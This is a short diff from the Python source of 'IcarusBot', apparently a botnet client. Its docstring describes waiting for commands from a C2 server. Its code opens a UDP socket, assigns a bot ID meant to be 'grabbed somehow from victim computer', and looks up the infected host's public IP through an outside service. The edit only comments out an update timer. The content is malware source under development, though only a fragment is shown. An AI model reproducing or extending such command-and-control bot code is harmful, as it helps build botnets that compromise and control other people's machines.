@@ -30,7 +30,7 @@ class IcarusBot:
             5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
                 5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
-        self.update_thread = threading.Timer(3.0, self.update)
+        #self.update_thread = threading.Timer(3.0, self.update)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
